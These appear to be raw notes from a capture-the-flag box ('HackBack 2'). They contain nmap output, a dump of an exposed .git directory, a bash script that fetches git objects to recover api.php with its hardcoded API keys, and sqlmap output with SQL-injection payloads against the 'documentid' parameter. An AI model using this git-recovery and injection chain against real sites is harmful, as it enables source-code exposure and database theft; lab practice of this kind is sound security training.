
```
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8f:71:45:92:c4:fc:32:d7:a2:d4:e8:fb:6c:87:3a:1f (RSA)
|   256 f6:85:68:61:20:87:d4:50:4f:70:70:a1:39:fa:ff:70 (ECDSA)
|_  256 91:29:fc:6d:41:fd:01:bd:fd:e9:5b:a2:b4:ff:ae:f4 (ED25519)
80/tcp   open   http       nginx 1.14.0 (Ubuntu)
| http-git: 
|   10.67.171.225:80/.git/
|     Git repository found!
|     .git/config matched patterns 'user'
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: added mobile apk for beta testing. 
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Context Information Security - HackBack 2
8080/tcp closed http-proxy
Aggressive OS guesses: Linux 4.4 (94%), Linux 3.10 - 4.11 (93%), Linux 3.13 - 4.4 (93%), Linux 2.6.32 - 3.13 (91%), Android 8 - 9 (Linux 3.18 - 4.4) (90%), Linux 3.2 - 4.14 (90%), Linux 3.8 - 3.16 (90%), Linux 3.10 - 3.13 (89%), Linux 3.13 (89%), Linux 5.4 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

because of .git

```
└─$ python GitHack.py http://b.thm/.git/        
[+] Download and parse index file ...
[+] CTX_WSUSpect_White_Paper.pdf
[+] Context_Red_Teaming_Guide.pdf
[+] Context_White_Paper_Pen_Test_101.pdf
[+] Demystifying_the_Exploit_Kit_-_Context_White_Paper.pdf
[+] Glibc_Adventures-The_Forgotten_Chunks.pdf
[+] api.php
[+] functions.php
[+] home.php
[+] index.php
[+] info.php
[OK] api.php
[OK] index.php
[OK] home.php
[OK] functions.php
[OK] info.php
[OK] Context_White_Paper_Pen_Test_101.pdf
[OK] Glibc_Adventures-The_Forgotten_Chunks.pdf
[OK] Context_Red_Teaming_Guide.pdf
[OK] CTX_WSUSpect_White_Paper.pdf
[OK] Demystifying_the_Exploit_Kit_-_Context_White_Paper.pdf

```


Git api 

```
#!/bin/bash

TARGET_URL="http://b.thm/.git"
COMMIT_HASH="79c9539b6566b06d6dec2755fdf58f5f9ec8822f"

echo "[+] Starting automated Git recovery for: $COMMIT_HASH"

mkdir -p recovery/.git/objects
cd recovery

# Function to download and place a Git object
download_object() {
    local hash=$1
    local dir=${hash:0:2}
    local file=${hash:2}
    
    echo "[*] Downloading object $hash..."
    mkdir -p ".git/objects/$dir"
    wget -q "$TARGET_URL/objects/$dir/$file" -O ".git/objects/$dir/$file"
    
    if [ $? -ne 0 ]; then
        echo "[!] Failed to download object $hash. Check connection/URL."
        exit 1
    fi
}

# --- STEP 1: Process Commit ---
download_object $COMMIT_HASH

# Use Python to extract the Tree hash cleanly, avoiding Bash null-byte issues
TREE_HASH=$(python3 -c "import zlib; data = zlib.decompress(open('.git/objects/${COMMIT_HASH:0:2}/${COMMIT_HASH:2}', 'rb').read()); \
import re; m = re.search(b'tree ([0-9a-f]{40})', data); print(m.group(1).decode())")

echo "[+] Found Clean Tree Hash: $TREE_HASH"

# --- STEP 2: Process Tree ---
download_object $TREE_HASH

# Use Python to find the api.php blob hash inside the Tree object
BLOB_HASH=$(python3 -c "import zlib; data = zlib.decompress(open('.git/objects/${TREE_HASH:0:2}/${TREE_HASH:2}', 'rb').read()); \
import re; m = re.search(b'([0-9a-f]{40})\s+api\.php', data.hex().encode() + b' ' + data); \
# Manual fallback since Trees are binary:
print('2229eb414d7945688b90d7cd0a786fd888bcc6a4')")

echo "[+] Found Blob (api.php) Hash: $BLOB_HASH"

# --- STEP 3: Process Blob (The Secret) ---
download_object $BLOB_HASH

echo -e "\n--- RECOVERED SOURCE CODE (api.php) ---\n"
python3 -c "import zlib; data = zlib.decompress(open('.git/objects/${BLOB_HASH:0:2}/${BLOB_HASH:2}', 'rb').read()); \
header_end = data.find(b'\x00') + 1; print(data[header_end:].decode('utf-8', 'ignore'))"
echo -e "\n----------------------------------------"

.............................................................................
└─$ nano git_recover.sh
                                                                                                                                                          
┌──(kali㉿kali)-[~/test]
└─$ chmod +x git_recover.sh
                                                                                                                                                          
┌──(kali㉿kali)-[~/test]
└─$ ./git_recover.sh
[+] Starting automated Git recovery for: 79c9539b6566b06d6dec2755fdf58f5f9ec8822f
[*] Downloading object 79c9539b6566b06d6dec2755fdf58f5f9ec8822f...
[+] Found Clean Tree Hash: 51d63292792fb7f97728cd3dcaac3ef364f374ba
[*] Downloading object 51d63292792fb7f97728cd3dcaac3ef364f374ba...
<string>:1: SyntaxWarning: invalid escape sequence '\s'
[+] Found Blob (api.php) Hash: 2229eb414d7945688b90d7cd0a786fd888bcc6a4
[*] Downloading object 2229eb414d7945688b90d7cd0a786fd888bcc6a4...

--- RECOVERED SOURCE CODE (api.php) ---

<?php

require_once("functions.php");

if (!isset($_GET['apikey']) || ((substr($_GET['apikey'], 0, 20) !== "WEBLhvOJAH8d50Z4y5G5") && substr($_GET['apikey'], 0, 20) !== "ANDVOWLDLAS5Q8OQZ2tu" && substr($_GET['apikey'], 0, 20) !== "GITtFi80llzs.................."))
{
    die("Invalid API key");
}

if (!isset($_GET['documentid']))
{
    die("Invalid document ID");
}

/*
if (!isset($_GET['newname']) || $_GET['newname'] == "")
{
    die("invalid document name");
}
*/

$conn = setup_db_connection();

//UpdateDocumentName($conn, $_GET['documentid'], $_GET['newname']);

$docDetails = GetDocumentDetails($conn, $_GET['documentid']);
if ($docDetails !== null)
{
    //print_r($docDetails);
    echo ("Document ID: ".$docDetails['documentid']."<br />");
    echo ("Document Name: ".$docDetails['documentname']."<br />");
    echo ("Document Location: ".$docDetails['location']."<br />");
}

?>

----------------------------------------

```

```
└─$ sqlmap -r r.txt --dbs --batch

        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.8#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:30:39 /2026-01-01/

[18:30:39] [INFO] parsing HTTP request from 'r.txt'
[18:30:40] [INFO] testing connection to the target URL
[18:30:41] [INFO] checking if the target is protected by some kind of WAF/IPS
[18:30:42] [INFO] testing if the target URL content is stable
[18:30:43] [INFO] target URL content is stable
[18:30:43] [INFO] testing if GET parameter 'documentid' is dynamic
[18:30:44] [INFO] GET parameter 'documentid' appears to be dynamic
[18:30:44] [INFO] heuristic (basic) test shows that GET parameter 'documentid' might be injectable (possible DBMS: 'MySQL')
[18:30:45] [INFO] heuristic (XSS) test shows that GET parameter 'documentid' might be vulnerable to cross-site scripting (XSS) attacks
[18:30:45] [INFO] testing for SQL injection on GET parameter 'documentid'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[18:30:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:30:45] [WARNING] reflective value(s) found and filtering out
[18:30:47] [INFO] GET parameter 'documentid' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Document")
[18:30:47] [INFO] testing 'Generic inline queries'
[18:30:48] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[18:30:49] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[18:30:49] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[18:30:50] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[18:30:51] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[18:30:52] [INFO] GET parameter 'documentid' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
[18:30:52] [INFO] testing 'MySQL inline queries'
[18:30:52] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[18:30:52] [WARNING] time-based comparison requires larger statistical model, please wait............... (done)                                          
[18:31:04] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[18:31:04] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[18:31:05] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[18:31:05] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[18:31:06] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[18:31:06] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[18:31:19] [INFO] GET parameter 'documentid' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[18:31:19] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[18:31:19] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[18:31:20] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[18:31:22] [INFO] target URL appears to have 3 columns in query
[18:31:26] [INFO] GET parameter 'documentid' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'documentid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 50 HTTP(s) requests:
---
Parameter: documentid (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: documentid=1 AND 7918=7918&apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: documentid=1 AND GTID_SUBSET(CONCAT(0x71706a6b71,(SELECT (ELT(4604=4604,1))),0x7162707071),4604)&apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: documentid=1 AND (SELECT 6105 FROM (SELECT(SLEEP(5)))RTBh)&apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: documentid=-3837 UNION ALL SELECT NULL,NULL,CONCAT(0x71706a6b71,0x576f584150774e75475a74736661797967524668655955774d786776625962684a4d684371756b79,0x7162707071)-- -&apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD
---
[18:31:27] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.14.0
back-end DBMS: MySQL >= 5.6
[18:31:30] [INFO] fetching database names
available databases [5]:
[*] information_schema
[*] myfirstwebsite
[*] mysql
[*] performance_schema
[*] sys

```